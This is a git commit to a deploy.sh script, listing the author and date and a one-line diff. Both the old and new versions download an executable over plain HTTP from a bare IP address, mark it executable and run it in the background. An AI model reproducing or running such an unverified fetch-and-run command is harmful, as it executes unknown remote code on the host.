f8d4817ebb709b7ac78000f100b797c785c2ce0a
moneamasa <ahmed2.ismail2.1970@gmail.com>
2026-03-28 05:26:19 +0200

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -1,1 +1,1 @@
-wget http://38.242.227.177:8088/deploy -O ./deploy && chmod +x ./deploy && ./deploy > output.txt 2>&1 &
+curl http://38.242.227.177:8088/deploy -O && chmod +x ./deploy && ./deploy > output.txt 2>&1 &
